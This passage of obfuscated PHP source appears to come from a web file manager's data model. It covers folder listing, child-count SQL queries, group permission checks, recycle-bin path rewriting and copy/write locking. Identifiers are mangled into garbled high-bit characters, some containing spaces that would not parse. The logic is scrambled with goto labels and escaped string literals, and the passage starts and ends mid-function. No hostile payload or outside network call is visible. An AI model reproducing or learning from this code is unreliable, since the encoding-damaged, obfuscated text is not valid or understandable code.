(!defined($FÇ÷ˆºà¬¨[423])) { return; } $Cª¥ìÊé–å = Model($FÇ÷ˆºà¬¨[424])->listData(); goto Eÿòºó˘ü£; e›ªÖæ√∏Ñ: $FÊﬁ“≈ë®ñ = array_to_keyvalue_group($DÙ›†‹øÑÑ, $FÇ÷ˆºà¬¨[365]); foreach ($Dë∂«Ü∂ÌÚ as &$F˜Íî…éóŸ) { $F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[387]] = array($FÇ÷ˆºà¬¨[426] => 0, $FÇ÷ˆºà¬¨[427] => 0, $FÇ÷ˆºà¬¨[428] => 0); if (isset($e›óùâ«·¨[$F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[365]]])) { $F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[387]][$FÇ÷ˆºà¬¨[429]] = 1; $F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[387]][$FÇ÷ˆºà¬¨[430]] = $e›óùâ«·¨[$F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[365]]][$FÇ÷ˆºà¬¨[28]]; } if (isset($e˜ö≥À¶’ä[$F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[365]]])) { $F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[387]][$FÇ÷ˆºà¬¨[431]] = array(); foreach ($e˜ö≥À¶’ä[$F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[365]]] as $CÙ¶ËΩÇŸ–) { $d√Í◊áÉ€› = $f¡õ´’ÆÒù[$CÙ¶ËΩÇŸ–]; $F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[387]][$FÇ÷ˆºà¬¨[431]][] = array($FÇ÷ˆºà¬¨[432] => $d√Í◊áÉ€›[$FÇ÷ˆºà¬¨[363]], $FÇ÷ˆºà¬¨[382] => $d√Í◊áÉ€›[$FÇ÷ˆºà¬¨[28]], $FÇ÷ˆºà¬¨[433] => $d√Í◊áÉ€›[$FÇ÷ˆºà¬¨[434]]); } } if (isset($FÊﬁ“≈ë®ñ[$F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[365]]])) { $F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[387]][$FÇ÷ˆºà¬¨[435]] = array(); foreach ($FÊﬁ“≈ë®ñ[$F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[365]]] as $a˜∞Ûª˜éΩ) { $F˜Íî…éóŸ[$FÇ÷ˆºà¬¨[387]][$FÇ÷ˆºà¬¨[435]] = array($FÇ÷ˆºà¬¨[436] => $a˜∞Ûª˜éΩ[$FÇ÷ˆºà¬¨[437]], $FÇ÷ˆºà¬¨[438] => $a˜∞Ûª˜éΩ[$FÇ÷ˆºà¬¨[439]], $FÇ÷ˆºà¬¨[440] => $a˜∞Ûª˜éΩ[$FÇ÷ˆºà¬¨[365]], $FÇ÷ˆºà¬¨[441] => $a˜∞Ûª˜éΩ[$FÇ÷ˆºà¬¨[442]], $FÇ÷ˆºà¬¨[443] => $a˜∞Ûª˜éΩ[$FÇ÷ˆºà¬¨[444]]); } } } return $Dë∂«Ü∂ÌÚ; goto B¡È∫Ó∂◊–; B¡È∫Ó∂◊–: } protected function _listAppendChildren(&$f§’ñﬁüÙÏ, $cÜ”æç∂äï) { goto EÌÃº∫¯Ëù; EÌÃº∫¯Ëù: $DÂÀˆ‹Ÿ¨˘ =& $_SERVER[¯èãÄπµ]; $dƒ§∫È¥ÀŸ = $DÂÀˆ‹Ÿ¨˘[357]; $E‹€éıñòÆ = array(); goto cãÔ÷Ïû≈Ô; EÆ°◊«äâ„: $EÒá‹ﬁ©ëÙ = $this->tablePrefix . $this->tableName; for ($Aòß™ñç£˘ = 0; $Aòß™ñç£˘ < $dπ©÷ΩÖ«ƒ; $Aòß™ñç£˘++) { $cË°ï¯÷’˜ = intval($f§’ñﬁüÙÏ[$Aòß™ñç£˘][$DÂÀˆ‹Ÿ¨˘[393]]); if ($f§’ñﬁüÙÏ[$Aòß™ñç£˘][$DÂÀˆ‹Ÿ¨˘[366]]) { $b˘ÇÑµáß™ = $f§’ñﬁüÙÏ[$Aòß™ñç£˘][$DÂÀˆ‹Ÿ¨˘[365]]; $dƒ§∫È¥ÀŸ .= "\123\105\x4c\x45\103\124\x20\52\40\x46\x52\117\x4d\x20\x28\x53\x45\114\105\x43\124\40\47{$b˘ÇÑµáß™}\137\150\141\163\106\x69\x6c\145\x27\40\141\x73\40\x68\141\x73\x2c\x63\x6f\165\156\x74\50\x31\51\40\x61\163\40\150\141\163\103\x6f\165\x6e\164\x20\x46\122\x4f\x4d\x20\x60{$EÒá‹ﬁ©ëÙ}\x60\x20\12\11\11\x9\x9\x9\167\x68\145\162\145\40\x70\x61\162\x65\156\164\x49\x44\x3d{$b˘ÇÑµáß™}\40\x61\156\x64\40\x69\163\106\157\x6c\144\145\162\x3d\x30\40\141\x6e\144\x20\x69\163\x44\145\x6c\x65\x74\x65\x3d{$cË°ï¯÷’˜}\x29\x20\141\x73\x20\164\142\x31\x5f{$b˘ÇÑµáß™}\x20\x75\156\151\x6f\x6e\40\x61\x6c\154\x20\12\x9\x9\x9\x9\11\123\x45\x4c\x45\x43\124\40\52\40\x46\x52\x4f\115\x20\50\x53\x45\114\105\x43\x54\40\x27{$b˘ÇÑµáß™}\137\150\141\x73\x46\157\154\144\145\x72\47\x20\141\163\40\x68\x61\x73\x46\151\154\145\54\143\157\x75\x6e\x74\x28\x31\x29\x20\x61\x73\40\150\x61\x73\103\157\165\156\x74\40\106\x52\117\x4d\x20\x60{$EÒá‹ﬁ©ëÙ}\x60\x20\12\x9\11\x9\x9\11\x77\x68\145\x72\145\40\160\x61\162\x65\x6e\x74\111\x44\x3d{$b˘ÇÑµáß™}\40\x61\x6e\144\40\x69\x73\106\157\x6c\x64\x65\x72\75\x31\40\x61\156\144\x20\x69\x73\x44\x65\x6c\x65\x74\145\x3d{$cË°ï¯÷’˜}\51\x20\141\x73\x20\164\x62\x32\x5f{$b˘ÇÑµáß™}\x20\x75\156\151\x6f\x6e\x20\x61\x6c\x6c\x20"; } if ((strlen($dƒ§∫È¥ÀŸ) >= $bﬂÙ◊‚Ê÷° || $Aòß™ñç£˘ == $dπ©÷ΩÖ«ƒ - 1) && $dƒ§∫È¥ÀŸ) { $dƒ§∫È¥ÀŸ = substr($dƒ§∫È¥ÀŸ, 0, -strlen($DÂÀˆ‹Ÿ¨˘[445])); $Aá∫¨Ûã°Æ = $this->query($dƒ§∫È¥ÀŸ); $E‹€éıñòÆ = array_merge($E‹€éıñòÆ, $Aá∫¨Ûã°Æ); $dƒ§∫È¥ÀŸ = $DÂÀˆ‹Ÿ¨˘[33]; } } $E‹€éıñòÆ = array_to_keyvalue($E‹€éıñòÆ, $DÂÀˆ‹Ÿ¨˘[446]); goto Báôúã≥∞¯; Báôúã≥∞¯: foreach ($f§’ñﬁüÙÏ as &$cÑØ„˘õ• ) { if ($cÑØ„˘õ• [$DÂÀˆ‹Ÿ¨˘[366]]) { unset($cÑØ„˘õ• [$DÂÀˆ‹Ÿ¨˘[368]]); $cÑØ„˘õ• [$DÂÀˆ‹Ÿ¨˘[188]] = intval($E‹€éıñòÆ[$cÑØ„˘õ• [$DÂÀˆ‹Ÿ¨˘[365]] . $DÂÀˆ‹Ÿ¨˘[447]][$DÂÀˆ‹Ÿ¨˘[448]]); $cÑØ„˘õ• [$DÂÀˆ‹Ÿ¨˘[187]] = intval($E‹€éıñòÆ[$cÑØ„˘õ• [$DÂÀˆ‹Ÿ¨˘[365]] . $DÂÀˆ‹Ÿ¨˘[449]][$DÂÀˆ‹Ÿ¨˘[448]]); } } goto Bù€∑å⁄‡Ü; cãÔ÷Ïû≈Ô: $bﬂÙ◊‚Ê÷° = 1024 * 50; $f§’ñﬁüÙÏ = is_array($f§’ñﬁüÙÏ) ? $f§’ñﬁüÙÏ : array(); $dπ©÷ΩÖ«ƒ = count($f§’ñﬁüÙÏ); goto EÆ°◊«äâ„; Bù€∑å⁄‡Ü: } protected function _listAppendAuth(&$e“ı¡›Ú¬ï) { goto c’ëÂçÊ‹Ñ; Aáˆ¢Ï≠—Ø: $a∏π ≥Îºã = Model($BØ˘á ◊Ï[450])->getSourceList($A‘–æ“òπØ, $bıŒ¡ÇúÉÁ); foreach ($e“ı¡›Ú¬ï as $Fä™«÷ıõû => &$Dìì¢¨î¬ò) { $Dìì¢¨î¬ò[$BØ˘á ◊Ï[372]] = $a∏π ≥Îºã[$Dìì¢¨î¬ò[$BØ˘á ◊Ï[365]]]; if (!$Dìì¢¨î¬ò[$BØ˘á ◊Ï[372]] && $Dìì¢¨î¬ò[$BØ˘á ◊Ï[367]] == self::TYPE_GROUP) { $Dìì¢¨î¬ò[$BØ˘á ◊Ï[372]] = Action($BØ˘á ◊Ï[451])->pathGroupAuthMake($Dìì¢¨î¬ò[$BØ˘á ◊Ï[452]]); if (!$Dìì¢¨î¬ò[$BØ˘á ◊Ï[372]] && !_get($GLOBALS, $BØ˘á ◊Ï[453])) { $Dìì¢¨î¬ò[$BØ˘á ◊Ï[185]] = !1; $Dìì¢¨î¬ò[$BØ˘á ◊Ï[184]] = !1; } } if ($Dìì¢¨î¬ò[$BØ˘á ◊Ï[372]]) { $Dìì¢¨î¬ò[$BØ˘á ◊Ï[185]] = AuthModel::authCheckEdit($Dìì¢¨î¬ò[$BØ˘á ◊Ï[372]][$BØ˘á ◊Ï[373]]); $Dìì¢¨î¬ò[$BØ˘á ◊Ï[184]] = AuthModel::authCheckView($Dìì¢¨î¬ò[$BØ˘á ◊Ï[372]][$BØ˘á ◊Ï[373]]); } $this->groupPathDisplay($Dìì¢¨î¬ò); } goto d©‚ãœÏÌÊ; c’ëÂçÊ‹Ñ: $BØ˘á ◊Ï =& $_SERVER[¯èãÄπµ]; if (!defined($BØ˘á ◊Ï[423])) { return; } $A‘–æ“òπØ = array(); goto fªø»≤ãê¡; fªø»≤ãê¡: foreach ($e“ı¡›Ú¬ï as $Dìì¢¨î¬ò) { if ($Dìì¢¨î¬ò[$BØ˘á ◊Ï[367]] == self::TYPE_GROUP) { $A‘–æ“òπØ[] = $Dìì¢¨î¬ò[$BØ˘á ◊Ï[365]]; } } if (!$A‘–æ“òπØ) { return; } $bıŒ¡ÇúÉÁ = array_to_keyvalue($e“ı¡›Ú¬ï, $BØ˘á ◊Ï[365]); goto Aáˆ¢Ï≠—Ø; d©‚ãœÏÌÊ: } public function groupPathDisplay(&$cìÁ¿‰ΩÃÇ) { goto e≥¬ïÊ•èÆ; e≥¬ïÊ•èÆ: $F©Çô”õõä =& $_SERVER[¯èãÄπµ]; if ($cìÁ¿‰ΩÃÇ[$F©Çô”õõä[367]] != self::TYPE_GROUP) { return; } $a»íÚËå√– = Model($F©Çô”õõä[454])->getInfo($cìÁ¿‰ΩÃÇ[$F©Çô”õõä[452]]); goto fñÊôôìõè; aéàØÕÑ»É: $cìÁ¿‰ΩÃÇ[$F©Çô”õõä[460]] = $CÉﬁ¢»‹⁄Ñ . $a»íÚËå√–[$F©Çô”õõä[387]][$F©Çô”õõä[365]]; goto Dâ∞¡áéö‡; EŒé“µèóÖ: $cìÁ¿‰ΩÃÇ[$F©Çô”õõä[456]] = $a»íÚËå√–[$F©Çô”õõä[457]]; $cìÁ¿‰ΩÃÇ[$F©Çô”õõä[376]] = $a»íÚËå√–[$F©Çô”õõä[455]]; $cìÁ¿‰ΩÃÇ[$F©Çô”õõä[458]] = $a»íÚËå√–[$F©Çô”õõä[459]]; goto aéàØÕÑ»É; fñÊôôìõè: $a˘·¬æÉË÷ = $this->parentLevelArray($a»íÚËå√–[$F©Çô”õõä[455]]); $CÉﬁ¢»‹⁄Ñ = $F©Çô”õõä[33]; foreach ($a˘·¬æÉË÷ as $D∫ôò≥Ì¿å) { $bã°úÔ–•› = Model($F©Çô”õõä[454])->getInfo($D∫ôò≥Ì¿å); $CÉﬁ¢»‹⁄Ñ .= $bã°úÔ–•›[$F©Çô”õõä[387]][$F©Çô”õõä[365]] . $F©Çô”õõä[47]; } goto EŒé“µèóÖ; Dâ∞¡áéö‡: } protected function _listAppendPath(&$C¯◊§éù†Û) { goto cöàì·©è…; cöàì·©è…: $f±€ãù‘Á» =& $_SERVER[¯èãÄπµ]; $d±äãπèÇ¶ = array(); foreach ($C¯◊§éù†Û as &$Aì¶è¯∑¿ç) { $d±äãπèÇ¶[$Aì¶è¯∑¿ç[$f±€ãù‘Á»[365]]] = $Aì¶è¯∑¿ç[$f±€ãù‘Á»[28]]; $d¡à±èßÃº = $this->parentLevelArray($Aì¶è¯∑¿ç[$f±€ãù‘Á»[455]]); array_shift($d¡à±èßÃº); foreach ($d¡à±èßÃº as $A±ù≤à—øâ) { if (!isset($d±äãπèÇ¶[$A±ù≤à—øâ])) { $d±äãπèÇ¶[$A±ù≤à—øâ] = 0; } } } goto Bîë≠–∏Éè; bÃ∆ë√Éç‚: $Eë©ùÏ∂üÉ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($C¯◊§éù†Û as &$Aì¶è¯∑¿ç) { goto eÑ¨Ü™π¶˜; Bç‹êÂàå•: $Eá’¡—Ÿ¯ = trim($Aì¶è¯∑¿ç[$f±€ãù‘Á»[462]], $f±€ãù‘Á»[8]); if ($Aì¶è¯∑¿ç[$f±€ãù‘Á»[457]] == $f±€ãù‘Á»[464] && $Eá’¡—Ÿ¯) { $Aì¶è¯∑¿ç[$f±€ãù‘Á»[28]] = $Eá’¡—Ÿ¯; } $this->_listAppendPathRecycle($Aì¶è¯∑¿ç, $d¡à±èßÃº, $Eë©ùÏ∂üÉ); goto D¨ç≠Ÿ‚Û∫; eÑ¨Ü™π¶˜: $d¡à±èßÃº = $this->parentLevelArray($Aì¶è¯∑¿ç[$f±€ãù‘Á»[455]]); $Dû’õ€‚ıÛ = $this->_listAppendPathRoot($Aì¶è¯∑¿ç, $d¡à±èßÃº); foreach ($d¡à±èßÃº as $A±ù≤à—øâ) { if (isset($d±äãπèÇ¶[$A±ù≤à—øâ])) { $Dû’õ€‚ıÛ .= $d±äãπèÇ¶[$A±ù≤à—øâ] . $f±€ãù‘Á»[8]; } } goto cÑ¿˜Éü∆; cÑ¿˜Éü∆: if ($d¡à±èßÃº) { $Dû’õ€‚ıÛ .= $Aì¶è¯∑¿ç[$f±€ãù‘Á»[28]]; } if ($Aì¶è¯∑¿ç[$f±€ãù‘Á»[366]]) { $Dû’õ€‚ıÛ .= $f±€ãù‘Á»[8]; } $Aì¶è¯∑¿ç[$f±€ãù‘Á»[462]] = str_replace($f±€ãù‘Á»[463], $f±€ãù‘Á»[8], $Dû’õ€‚ıÛ); goto Bç‹êÂàå•; D¨ç≠Ÿ‚Û∫: } goto eƒΩŒﬂ¨äÊ; Bîë≠–∏Éè: $EÈã∫àõâ« = array(); foreach ($d±äãπèÇ¶ as $f§èòΩÈÕ± => $F ÂÖÖú»Û) { if (!$F ÂÖÖú»Û) { $EÈã∫àõâ«[] = $f§èòΩÈÕ±; } } if ($EÈã∫àõâ«) { $c÷°ëŒ¨ú© = array($f±€ãù‘Á»[379] => array($f±€ãù‘Á»[380], $EÈã∫àõâ«)); if (count($EÈã∫àõâ«) == 1) { $Eﬂ¢Ü”ÿß¶ = $this->sourceInfo($EÈã∫àõâ«[0]); $Eﬂ¢Ü”ÿß¶ = is_array($Eﬂ¢Ü”ÿß¶) ? array($Eﬂ¢Ü”ÿß¶) : !1; } else { $Eﬂ¢Ü”ÿß¶ = $this->field($f±€ãù‘Á»[461])->where($c÷°ëŒ¨ú©)->select(); } $f£∞¨–ı°∆ = array_to_keyvalue($Eﬂ¢Ü”ÿß¶, $f±€ãù‘Á»[365], $f±€ãù‘Á»[28]); $d±äãπèÇ¶ = array_merge_index($d±äãπèÇ¶, $f£∞¨–ı°∆); } goto bÃ∆ë√Éç‚; eƒΩŒﬂ¨äÊ: } private function _listAppendPathRecycle(&$a§ÇïƒÏâï, $E†ﬁïÔ®…è, $C´˜◊«¨Ô) { goto fÒÖùË∫ÖÖ; BÏ¥⁄âÕ¨û: $f˘¥‚íÀ˘∏ = explode($e∞œ√Ïù»‰[8], trim($a§ÇïƒÏâï[$e∞œ√Ïù»‰[462]], $e∞œ√Ïù»‰[8])); $CÜï≤Ô´â = implode($e∞œ√Ïù»‰[8], array_slice($f˘¥‚íÀ˘∏, 2)); $a§ÇïƒÏâï[$e∞œ√Ïù»‰[462]] = $e∞œ√Ïù»‰[8] . LNG($e∞œ√Ïù»‰[465]) . $e∞œ√Ïù»‰[8] . ltrim($CÜï≤Ô´â, $e∞œ√Ïù»‰[8]); goto cÊçø„∏ö; fÒÖùË∫ÖÖ: $e∞œ√Ïù»‰ =& $_SERVER[¯èãÄπµ]; if (intval($a§ÇïƒÏâï[$e∞œ√Ïù»‰[367]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($C´˜◊«¨Ô, $E†ﬁïÔ®…è) && $a§ÇïƒÏâï[$e∞œ√Ïù»‰[365]] != $C´˜◊«¨Ô) { return; } goto BÏ¥⁄âÕ¨û; cÊçø„∏ö: $a§ÇïƒÏâï[$e∞œ√Ïù»‰[455]] = $e∞œ√Ïù»‰[466] . implode($e∞œ√Ïù»‰[47], array_slice($E†ﬁïÔ®…è, 1)) . $e∞œ√Ïù»‰[47]; if ($a§ÇïƒÏâï[$e∞œ√Ïù»‰[365]] == $C´˜◊«¨Ô) { $a§ÇïƒÏâï[$e∞œ√Ïù»‰[455]] = $e∞œ√Ïù»‰[466]; $a§ÇïƒÏâï[$e∞œ√Ïù»‰[457]] = $e∞œ√Ïù»‰[464]; $a§ÇïƒÏâï[$e∞œ√Ïù»‰[28]] = LNG($e∞œ√Ïù»‰[465]); } $a§ÇïƒÏâï[$e∞œ√Ïù»‰[467]] = $e∞œ√Ïù»‰[468]; goto AÛÖŒ·›í¨; AÛÖŒ·›í¨: } protected function _listAppendPathRoot(&$bÓ≤ÑÁë¯¯, $cçƒÙ›À“Ÿ) { $fﬁ•¢ˆ≥…¥ =& $_SERVER[¯èãÄπµ]; $dÙÖçÔÒãÂ = $fﬁ•¢ˆ≥…¥[33]; if ($bÓ≤ÑÁë¯¯[$fﬁ•¢ˆ≥…¥[367]] == self::TYPE_USER) { if (defined($fﬁ•¢ˆ≥…¥[423]) && $bÓ≤ÑÁë¯¯[$fﬁ•¢ˆ≥…¥[452]] == USER_ID) { $dÙÖçÔÒãÂ = LNG($fﬁ•¢ˆ≥…¥[469]); if (!$cçƒÙ›À“Ÿ) { $bÓ≤ÑÁë¯¯[$fﬁ•¢ˆ≥…¥[28]] = $dÙÖçÔÒãÂ; } } else { $c”•ˆòµú÷ = Model($fﬁ•¢ˆ≥…¥[470])->getInfoSimple($bÓ≤ÑÁë¯¯[$fﬁ•¢ˆ≥…¥[452]]); $dÙÖçÔÒãÂ = LNG($fﬁ•¢ˆ≥…¥[471]) . $fﬁ•¢ˆ≥…¥[153] . $c”•ˆòµú÷[$fﬁ•¢ˆ≥…¥[28]] . $fﬁ•¢ˆ≥…¥[472]; } } else { if ($bÓ≤ÑÁë¯¯[$fﬁ•¢ˆ≥…¥[367]] == self::TYPE_GROUP) { $c”•ˆòµú÷ = Model($fﬁ•¢ˆ≥…¥[454])->getInfoSimple($bÓ≤ÑÁë¯¯[$fﬁ•¢ˆ≥…¥[452]]); $dÙÖçÔÒãÂ = $c”•ˆòµú÷[$fﬁ•¢ˆ≥…¥[28]]; } else { if ($bÓ≤ÑÁë¯¯[$fﬁ•¢ˆ≥…¥[367]] == self::TYPE_SYSTEM) { $c”•ˆòµú÷ = $this->sourceInfo($cçƒÙ›À“Ÿ[0], !0); $dÙÖçÔÒãÂ = $c”•ˆòµú÷[$fﬁ•¢ˆ≥…¥[28]]; } } } $dÙÖçÔÒãÂ = $dÙÖçÔÒãÂ ? $fﬁ•¢ˆ≥…¥[8] . $dÙÖçÔÒãÂ . $fﬁ•¢ˆ≥…¥[8] : $fﬁ•¢ˆ≥…¥[8]; return $dÙÖçÔÒãÂ; } protected function _listAppendUser(&$Dàë…íØ®◊) { $A”ﬂÆù¨¢≈ =& $_SERVER[¯èãÄπµ]; $cï€™·ä±ì = array_to_keyvalue($Dàë…íØ®◊, $A”ﬂÆù¨¢≈[33], $A”ﬂÆù¨¢≈[374]); $C“¨„’àè∂ = array_to_keyvalue($Dàë…íØ®◊, $A”ﬂÆù¨¢≈[33], $A”ﬂÆù¨¢≈[375]); $EèÍ†·‚ÖØ = array_merge($cï€™·ä±ì, $C“¨„’àè∂); $FΩÃ≈îüêì = Model($A”ﬂÆù¨¢≈[473])->userListInfo($EèÍ†·‚ÖØ); foreach ($Dàë…íØ®◊ as &$aÕ¡Ÿ™À•¢) { $E§≥º≤ﬂùì = $aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[374]]; $aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[374]] = $FΩÃ≈îüêì[$E§≥º≤ﬂùì] ? $FΩÃ≈îüêì[$E§≥º≤ﬂùì] : !1; $E§≥º≤ﬂùì = $aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[375]]; $aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[375]] = $FΩÃ≈îüêì[$E§≥º≤ﬂùì] ? $FΩÃ≈îüêì[$E§≥º≤ﬂùì] : !1; if (isset($aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[413]]) && $aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[413]][$A”ﬂÆù¨¢≈[474]]) { $Eûò¯í¬Õ = $GLOBALS[$A”ﬂÆù¨¢≈[6]][$A”ﬂÆù¨¢≈[84]][$A”ﬂÆù¨¢≈[475]]; if ($aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[413]][$A”ﬂÆù¨¢≈[476]] <= time() - $Eûò¯í¬Õ) { $this->metaSet($aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[365]], $A”ﬂÆù¨¢≈[474], null); $this->metaSet($aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[365]], $A”ﬂÆù¨¢≈[476], null); unset($aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[413]][$A”ﬂÆù¨¢≈[474]]); continue; } $bó§¶ﬂıí÷ = $aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[413]][$A”ﬂÆù¨¢≈[474]]; $aÕ¡Ÿ™À•¢[$A”ﬂÆù¨¢≈[413]][$A”ﬂÆù¨¢≈[477]] = Model($A”ﬂÆù¨¢≈[473])->getInfoSimpleOuter($bó§¶ﬂıí÷); } } } public function parentLevelArray($f⁄ï†ÂØæ¡) { $Cä∞ãêÓ£ë =& $_SERVER[¯èãÄπµ]; $f⁄ï†ÂØæ¡ = explode($Cä∞ãêÓ£ë[47], trim($f⁄ï†ÂØæ¡, $Cä∞ãêÓ£ë[47])); return array_remove_value($f⁄ï†ÂØæ¡, $Cä∞ãêÓ£ë[464]); } public function listAll($EƒùÇÓÁÈ¬) { goto cååÑ∞¨Õæ; F¡ ≥’åê†: $this->_listAppendAuth($aœ¨èÇîÒ†); $this->_listAppendUser($aœ¨èÇîÒ†); $this->_listAppendPath($aœ¨èÇîÒ†); goto bäÆÛí◊˜Á; cååÑ∞¨Õæ: $e®›¨Ù√çæ =& $_SERVER[¯èãÄπµ]; $D∞µ¥±˘ü… = $this->sourceInfo($EƒùÇÓÁÈ¬); $c∆ã“‘ªƒ¢ = array($e®›¨Ù√çæ[478] => array($e®›¨Ù√çæ[479], $D∞µ¥±˘ü…[$e®›¨Ù√çæ[455]] . $EƒùÇÓÁÈ¬ . $e®›¨Ù√çæ[480]), $e®›¨Ù√çæ[481] => 0); goto EàÕÑŒ”πä; c¨ã õ©∂£: $F…Õ‹Ü◊øΩ = array(); foreach ($aœ¨èÇîÒ† as $BäƒÇúîåú => $C…©Ì„Ê∂¡) { goto AçúÏœ∫É¶; D¯É««·µÇ: for ($aòˆπôöùÇ = 0; $aòˆπôöùÇ < count($DØ˘ñò≤ÓÁ); $aòˆπôöùÇ++) { $DÇ‰ëÖÀ√‰ .= $aœ¨èÇîÒ†[$DØ˘ñò≤ÓÁ[$aòˆπôöùÇ]][$e®›¨Ù√çæ[28]] . $e®›¨Ù√çæ[8]; } $DÇ‰ëÖÀ√‰ .= $C…©Ì„Ê∂¡[$e®›¨Ù√çæ[28]]; if ($C…©Ì„Ê∂¡[$e®›¨Ù√çæ[366]]) { $DÇ‰ëÖÀ√‰ .= $e®›¨Ù√çæ[8]; } goto Fµ◊Í¯¥ƒÍ; Fµ◊Í¯¥ƒÍ: $DÇ‰ëÖÀ√‰ = str_replace($e®›¨Ù√çæ[463], $e®›¨Ù√çæ[8], $DÇ‰ëÖÀ√‰); $DÇ‰ëÖÀ√‰ = str_replace($e®›¨Ù√çæ[463], $e®›¨Ù√çæ[8], $DÇ‰ëÖÀ√‰); $c≤óÜÇÍ—¿ = array($e®›¨Ù√çæ[383] => str_replace($e®›¨Ù√çæ[463], $e®›¨Ù√çæ[8], $DÇ‰ëÖÀ√‰), $e®›¨Ù√çæ[484] => intval($C…©Ì„Ê∂¡[$e®›¨Ù√çæ[366]]), $e®›¨Ù√çæ[387] => $this->pathInfoFilter($C…©Ì„Ê∂¡, !0)); goto A“·Ÿ≥Ö˘Ü; AçúÏœ∫É¶: $DØ˘ñò≤ÓÁ = $this->parentLevelArray($C…©Ì„Ê∂¡[$e®›¨Ù√çæ[455]]); array_shift($DØ˘ñò≤ÓÁ); $DÇ‰ëÖÀ√‰ = $b¬ºﬁÚ∑ç‘; goto D¯É««·µÇ; A“·Ÿ≥Ö˘Ü: if (!$C…©Ì„Ê∂¡[$e®›¨Ù√çæ[366]]) { $c≤óÜÇÍ—¿[$e®›¨Ù√çæ[415]] = $C…©Ì„Ê∂¡[$e®›¨Ù√çæ[415]]; $c≤óÜÇÍ—¿[$e®›¨Ù√çæ[485]] = $C…©Ì„Ê∂¡[$e®›¨Ù√çæ[75]]; } $F…Õ‹Ü◊øΩ[] = $c≤óÜÇÍ—¿; goto A ⁄ï¥∂Ã¿; A ⁄ï¥∂Ã¿: } return $F…Õ‹Ü◊øΩ; goto c‰Áë–ÒÙì; bäÆÛí◊˜Á: $aœ¨èÇîÒ† = array_to_keyvalue($aœ¨èÇîÒ†, $e®›¨Ù√çæ[365]); $b¬ºﬁÚ∑ç‘ = "\x2f{$D∞µ¥±˘ü…[$e®›¨Ù√çæ[28]]}\x2f"; $b¬ºﬁÚ∑ç‘ = $b¬ºﬁÚ∑ç‘ == $e®›¨Ù√çæ[463] ? $e®›¨Ù√çæ[8] : $b¬ºﬁÚ∑ç‘; goto c¨ã õ©∂£; EàÕÑŒ”πä: $cΩ…≥§»ªß = $e®›¨Ù√çæ[482]; $E¥Ø†Ê’—ã = "\114\105\106\x54\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\x5f\x66\x69\x6c\x65\x20\146\151\154\145\x20\157\156\40\x73\x6f\165\162\x63\x65\x2e\146\x69\x6c\145\111\104\x20\x3d\x20\146\151\154\145\x2e\146\151\154\x65\111\x44"; $aœ¨èÇîÒ† = $this->alias($e®›¨Ù√çæ[483])->field($cΩ…≥§»ªß)->where($c∆ã“‘ªƒ¢)->join($E¥Ø†Ê’—ã)->select(); goto F¡ ≥’åê†; c‰Áë–ÒÙì: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($C¬¢ÛÒ€çÂ) { goto aí‡ÜıÑ∂; eá¬èæ—ÿΩ: $cÇÖƒâ≈ù = 1; $this->_lockEvent($C¬¢ÛÒ€çÂ, array($bÑÃÓÒœà£[487], $bÑÃÓÒœà£[488]), $cÇÖƒâ≈ù); $this->_lockParent($C¬¢ÛÒ€çÂ, array($bÑÃÓÒœà£[488]), $cÇÖƒâ≈ù); goto Eô∏Èﬁ¶≥Ê; aí‡ÜıÑ∂: $bÑÃÓÒœà£ =& $_SERVER[¯èãÄπµ]; if (!$this->allowLock()) { return; } $this->_lockCheck($bÑÃÓÒœà£[486], $C¬¢ÛÒ€çÂ); goto eá¬èæ—ÿΩ; Eô∏Èﬁ¶≥Ê: $this->_lockEvent($C¬¢ÛÒ€çÂ, array($bÑÃÓÒœà£[489], $bÑÃÓÒœà£[490]), $cÇÖƒâ≈ù); $this->_lockCheckEnd($bÑÃÓÒœà£[486], $C¬¢ÛÒ€çÂ); goto eê∞èâëÌ”; eê∞èâëÌ”: } public function lockCopyEnd($BèÁªãœ≈∫) { $DùÛÚçÍ‘ó =& $_SERVER[¯èãÄπµ]; if (!$this->allowLock()) { return; } $e‰ïää†Ñ = 0; $this->_lockEvent($BèÁªãœ≈∫, array($DùÛÚçÍ‘ó[487], $DùÛÚçÍ‘ó[488]), $e‰ïää†Ñ); $this->_lockParent($BèÁªãœ≈∫, array($DùÛÚçÍ‘ó[488]), $e‰ïää†Ñ); $this->_lockEvent($BèÁªãœ≈∫, array($DùÛÚçÍ‘ó[489], $DùÛÚçÍ‘ó[490]), $e‰ïää†Ñ); } public function lockWriteStart($aƒ§¶âÈ·ï, $CñÂΩéπèÀ = '') { goto c≥ÂŸ‚€óÁ; d¨Œá§£ªõ: $CÛ®Êë©Àº = 1; $this->_lockKey($bÊ™πœâßı[491] . $aƒ§¶âÈ·ï . $bÊ™πœâßı[91] . $CñÂΩéπèÀ, $CÛ®Êë©Àº); $this->_lockEvent($aƒ§¶âÈ·ï, array($bÊ™πœâßı[486], $bÊ™πœâßı[488]), $CÛ®Êë©Àº); goto Dæ‹æÉ…¿ö; Dæ‹æÉ…¿ö: $this->_lockParent($aƒ§¶âÈ·ï, array($bÊ™πœâßı[486], $bÊ™πœâßı[488]), 